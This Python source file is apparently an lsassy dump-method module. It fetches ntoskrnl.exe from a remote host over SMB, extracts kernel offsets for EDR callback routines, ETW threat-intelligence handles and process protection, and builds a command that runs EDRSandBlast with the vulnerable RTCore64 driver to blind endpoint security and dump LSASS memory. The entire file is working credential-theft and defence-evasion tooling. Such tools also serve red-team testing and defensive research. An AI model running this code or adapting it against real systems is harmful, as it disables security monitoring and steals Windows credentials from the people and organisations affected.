"""
https://github.com/wavestone-cdt/EDRSandblast
"""

import os
import random
import string
import subprocess
import sys
import threading

CSVLock = threading.Lock()

from lsassy.dumpmethod import Dependency, IDumpMethod
from lsassy.logger import lsassy_logger

machineType = dict(x86=332, x64=34404)
knownImageVersions = dict(ntoskrnl=list(), wdigest=list())
extensions_by_mode = dict(ntoskrnl="exe", wdigest="dll")


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.edrsandblast = Dependency("edrsandblast", "EDRSandBlast.exe")
        self.RTCore64 = Dependency("RTCore64", "RTCore64.sys")
        self.ntoskrnl = Dependency("ntoskrnl", "NtoskrnlOffsets.csv")

        self.tmp_ntoskrnl = (
            "lsassy_"
            + "".join(
                random.choice(string.ascii_letters + string.digits) for _ in range(32)
            )
            + ".exe"
        )

    def prepare(self, options):
        if os.name == "nt":
            tmp_dir = "C:\\Windows\\Temp\\"
        else:
            tmp_dir = "/tmp/"
        with open("{}{}".format(tmp_dir, self.tmp_ntoskrnl), "wb") as p:
            try:
                self._session.smb_session.getFile(
                    "C$", "\\Windows\\System32\\ntoskrnl.exe", p.write
                )
                lsassy_logger.info(
                    "ntoskrnl.exe downloaded to {}{}".format(tmp_dir, self.tmp_ntoskrnl)
                )
            except Exception:
                lsassy_logger.error("ntoskrnl.exe download error", exc_info=True)
                try:
                    os.remove("{}{}".format(tmp_dir, self.tmp_ntoskrnl))
                except Exception:
                    return None
                return None
        self.ntoskrnl.content = self.extractOffsets(
            "{}{}".format(tmp_dir, self.tmp_ntoskrnl), "ntoskrnl"
        )

        if self.ntoskrnl.content is not None:
            lsassy_logger.info("ntoskrnl offsets extracted")
            lsassy_logger.debug(self.ntoskrnl.content.split("\n")[1])
        os.remove("{}{}".format(tmp_dir, self.tmp_ntoskrnl))

        return self.prepare_dependencies(
            options, [self.edrsandblast, self.RTCore64, self.ntoskrnl]
        )

    def clean(self):
        self.clean_dependencies([self.edrsandblast, self.RTCore64, self.ntoskrnl])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} dump --usermode --kernelmode --driver {} --nt-offsets {} -o {}{}""".format(
            self.edrsandblast.get_remote_path(),
            self.RTCore64.get_remote_path(),
            self.ntoskrnl.get_remote_path(),
            self.dump_path,
            self.dump_name,
        )

        return {"cmd": cmd_command, "pwsh": cmd_command}

    def run(self, args, **kargs):
        """Wrap subprocess.run to works on Windows and Linux"""
        # Windows needs shell to be True, to locate binary automatically
        # On Linux, shell needs to be False to manage lists in args
        shell = sys.platform in ["win32"]
        return subprocess.run(args, shell=shell, **kargs)

    def get_symbol_offset(self, symbols_info, symbol_name):
        for line in symbols_info:
            # sometimes, a "_" is prepended to the symbol name ...
            if line.strip().split(" ")[-1].endswith(symbol_name):
                return int(line.split(" ")[0], 16)
        else:
            return 0

    def get_field_offset(self, symbols_info, field_name):
        for line in symbols_info:
            if field_name in line:
                assert "offset" in line
                symbol_offset = int(line.split("+")[-1], 16)
                return symbol_offset
        else:
            return 0

    def get_file_version(self, path):
        # dump version number using r2
        r = self.run(["r2", "-c", "iV", "-qq", path], capture_output=True)
        for line in r.stdout.decode().splitlines():
            line = line.strip()
            if line.startswith("FileVersion:"):
                return [int(frag) for frag in line.split(" ")[-1].split(".")]

        lsassy_logger.debug(f"[!] ERROR : failed to extract version from {path}.")
        raise RuntimeError("get_file_version error")

    def extractOffsets(self, input_file, mode):
        output_result = ""
        try:
            # check image type (ntoskrnl, wdigest, etc.)
            r = self.run(["r2", "-c", "iE", "-qq", input_file], capture_output=True)
            for line in r.stdout.decode().splitlines():
                if "ntoskrnl.exe" in line:
                    imageType = "ntoskrnl"
                    break
                elif "wdigest.dll" in line:
                    imageType = "wdigest"
                    break
            else:
                lsassy_logger.debug(f"[*] File {input_file} unrecognized")
                return

            # todo : remove this and make a unique function
            if mode != imageType:
                lsassy_logger.debug(
                    f"[*] Skipping {input_file} since we are in {mode} mode"
                )
                return
            if os.path.sep not in input_file:
                input_file = "." + os.path.sep + input_file
            full_version = self.get_file_version(input_file)

            # Checks if the image version is already present in the CSV
            extension = extensions_by_mode[imageType]
            imageVersion = (
                f"{imageType}_{full_version[2]}-{full_version[3]}.{extension}"
            )

            if imageVersion in knownImageVersions[imageType]:
                lsassy_logger.debug(
                    f"[*] Skipping known {imageType} version {imageVersion} (file: {input_file})"
                )
                return

            lsassy_logger.debug(
                f"[*] Processing {imageType} version {imageVersion} (file: {input_file})"
            )
            # download the PDB if needed
            r = self.run(["r2", "-c", "idpd", "-qq", input_file], capture_output=True)
            # dump all symbols
            r = self.run(
                ["r2", "-c", "idpi", "-qq", "-B", "0", input_file], capture_output=True
            )
            all_symbols_info = [line.strip() for line in r.stdout.decode().splitlines()]

            if imageType == "ntoskrnl":
                symbols = [
                    ("PspCreateProcessNotifyRoutine", self.get_symbol_offset),
                    ("PspCreateThreadNotifyRoutine", self.get_symbol_offset),
                    ("PspLoadImageNotifyRoutine", self.get_symbol_offset),
                    ("_PS_PROTECTION Protection", self.get_field_offset),
                    ("EtwThreatIntProvRegHandle", self.get_symbol_offset),
                    ("_ETW_GUID_ENTRY* GuidEntry", self.get_field_offset),
                    ("_TRACE_ENABLE_INFO ProviderEnableInfo", self.get_field_offset),
                    ("PsProcessType", self.get_symbol_offset),
                    ("PsThreadType", self.get_symbol_offset),
                    ("struct _LIST_ENTRY CallbackList", self.get_field_offset),
                ]
            elif imageType == "wdigest":
                symbols = [
                    ("g_fParameter_UseLogonCredential", self.get_symbol_offset),
                    ("g_IsCredGuardEnabled", self.get_symbol_offset),
                ]

            symbols_values = list()
            for symbol_name, get_offset in symbols:
                symbol_value = get_offset(all_symbols_info, symbol_name)
                symbols_values.append(symbol_value)
                # lsassy_logger.debug(f"[+] {symbol_name} = {hex(symbol_value)}")

            output_result += f'{imageVersion},{",".join(hex(val).replace("0x", "") for val in symbols_values)}\n'

            knownImageVersions[imageType].append(imageVersion)

            lsassy_logger.debug(f"[+] Finished processing of {imageType} {input_file}!")
            lsassy_logger.debug(output_result)
            return output_result

        except Exception as e:
            lsassy_logger.debug(f"[!] ERROR : Could not process file {input_file}.")
            lsassy_logger.debug(f"[!] Error message: {e}")
            lsassy_logger.debug(
                "[!] If error is of the like of \"'NoneType' object has no attribute 'group'\", kernel callbacks may not be supported by this version."
            )
            return None
